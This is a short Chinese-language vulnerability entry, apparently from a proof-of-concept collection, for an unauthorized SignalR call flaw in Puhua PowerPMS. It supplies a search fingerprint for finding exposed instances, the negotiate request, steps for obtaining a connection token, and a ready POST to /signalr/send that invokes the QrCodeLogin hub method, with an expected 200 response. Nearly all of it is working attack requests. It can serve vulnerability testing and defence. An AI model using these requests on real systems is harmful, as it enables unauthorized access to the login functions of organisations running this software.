# 普华PMSsignalr存在未授权调用漏洞

- **系统**：普华　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`app="普华科技-PowerPMS"`
- **请求**：`GET /signalr/negotiate?clientProtocol=1.3&connectionData=[{"name":"AppHub"},{"name":"MessagePool"}] HTTP/1.1`

**请求体 / payload**
```
前端接口获取
[http://ip/signalr/hubs](http://ip/signalr/hubs)
调用signalr实现token获取
Host:
携带connection token写入数据
POST /signalr/send?transport=longPolling&clientProtocol=1.3&connectionToken=<token>&connectionId=<id> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host:
data=%7B%22H%22%3A%22AppHub%22%2C%22M%22%3A%22QrCodeLogin%22%2C%22A%22%3A%5B%22probe_id_123%22%2C%22%7B%7D%22%5D%2C%22I%22%3A0%7D
```
- **预期**：200　|　—